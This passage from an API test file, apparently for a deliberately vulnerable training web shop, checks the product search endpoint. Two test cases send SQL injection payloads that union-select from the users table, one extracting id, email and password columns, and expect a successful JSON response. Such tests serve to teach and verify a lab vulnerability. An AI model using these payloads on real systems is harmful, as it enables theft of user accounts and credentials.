...
describe('/rest/product/search', () => {
  ...
  it('GET product search can create UNION SELECT with Users table and fixed columns', () => {
    return frisby.get(REST_URL + '/product/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' from users--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        id: '1',
  ...
  it('GET product search can create UNION SELECT with Users table and required columns', () => {
    return frisby.get(REST_URL + '/product/search?q=\')) union select null,id,email,password,null,null,null,null,null from users--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        name: 1,
